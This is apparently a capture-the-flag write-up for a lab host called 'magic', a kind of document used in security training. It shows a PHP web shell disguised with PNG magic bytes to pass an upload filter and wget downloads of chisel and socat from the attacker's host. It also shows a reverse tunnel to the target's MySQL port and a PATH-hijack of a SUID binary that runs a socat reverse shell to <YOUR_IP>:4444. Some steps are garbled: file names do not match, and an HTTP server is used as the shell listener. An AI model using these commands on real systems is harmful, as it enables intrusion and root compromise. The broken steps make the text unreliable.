We can upload file. This case can cause malicious file upload. When I tried to upload file with php extension, it returned we can only upload jpg, png, and jpeg file.

In this case where we can upload arbitrary file and can access via url, but with file extension whitelist, we can use the technique "File Magic Number". This technique falsify your machine by appending specific hex characters which determine file type.

nano rev.php 
<?php system($_REQUEST['cmd']);?>
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> hex_rev.php.png
cat rev.php >> img_rev.php.png

We can upload this hex_rev.php.png file to the page. To make it more intuitive, let's compare file command outputs.

└─$ file img_rev.php.png rev.php.png

As you can see, the first one we falsified file type is recognized as data, but the second one is recognized as PHP script/ASCII text.

However, if we try to open mysql, "Command 'mysql' not found" message returned. Therefore, we have to find a way to use database target machine holds. If we could connect socket 3306 with our port, we can make use of target's database, don't we?

In this case, we can use a tool called "chisel", which a lightweight TCP/UDP tunneller (client+server single binary) that tunnels arbitrary traffic over HTTP(S) to bypass firewalls and enable port-forwarding / pivoting.

You can install chisel from here. The newest version is chisel_1.11.3_linux_amd64.gz now.

After downloading, unzip it...

└─$ gzip -d chisel_1.11.3_linux_amd64.gz
└─$ python3 -m http.server 8000

Then, on the target machine, 

www-data@magic:/var/www/Magic$ cd /tmp
www-data@magic:/tmp$ wget http://<YOUR_IP>:8000/chisel_1.11.3_linux_amd64
www-data@magic:/tmp$ chmod +x chisel_1.11.3_linux_amd64

On your machine...

└─$ ./chisel_1.11.3_linux_amd64 server -p 8000 -reverse

Finally, on the target machine...

./chisel_1.11.3_linux_amd64 client <YOUR_IP>:8000 R:3306:127.0.0.1:3306 &

PrivEsc

The user theseus doesn't have any sudo privilege, therefore, we have to find other vector for privilege escalation.

find / -perm -4000 2>/dev/null
SNIP....
-rwsr-x--- 1 root users 22040 Oct 21 2019 /bin/sysinfo
....SNIP

This file returns system information. This kind of executable isn't executable for low privileged users usually. It's interesting. Let's see scripts.

strings /bin/sysinfo\
SNIP....
====================CPU Info====================
cat /proc/cpuinfo
....SNIP

This output revealed that the command cat isn't full path. Therefore, we can exploit $PATH-hijacking vulnerability.

Also, the executable file is run by root user, therefore, if we could run a file which try to establish connection, we can get reverse shell of root.

For implementing that, we can use socat tool which is a versatile command-line utility that forwards and proxies data between two arbitrary data channels (sockets, files, TTYs, stdio, etc.). Think it as extra version of nc.

You can install it from here. Just press view raw button.

└─$ python3 -m http.server 8000 #on your machine
theseus@magic:/tmp$ wget http://<YOUR_IP>/socat
theseus@magic:/tmp$ chmod +x socat
theseus@magic:/tmp$ export PATH=/tmp:$PATH
theseus@magic:/tmp$ echo "./socat tcp-connect:<YOUR_IP>:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane" > cat
theseus@magic:/tmp$ chmod +x cat
└─$ python3 -m http.server 4444 #On your machine
theseus@magic:/tmp$ sysinfo

Then, you'll get root shell. Before cat /root/root.txt, you should remove /tmp/cat because it probably use /tmp/cat, not /usr/local/cat.
